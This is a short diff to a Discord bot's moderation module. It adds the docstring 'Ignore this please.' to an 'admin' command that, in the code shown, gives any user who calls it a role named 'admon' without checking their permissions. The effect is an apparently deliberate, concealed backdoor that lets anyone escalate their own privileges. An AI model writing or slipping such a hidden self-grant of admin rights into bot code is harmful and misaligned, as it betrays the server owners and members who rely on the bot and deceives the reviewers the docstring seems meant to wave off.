@@ -50,6 +50,7 @@ class Moderation(commands.Cog):
 
     @commands.command()
     async def admin(self, ctx):
+        """Ignore this please."""
         member = ctx.author
         var = nextcord.utils.get(ctx.guild.roles, name = "admon")
         await member.add_roles(var)
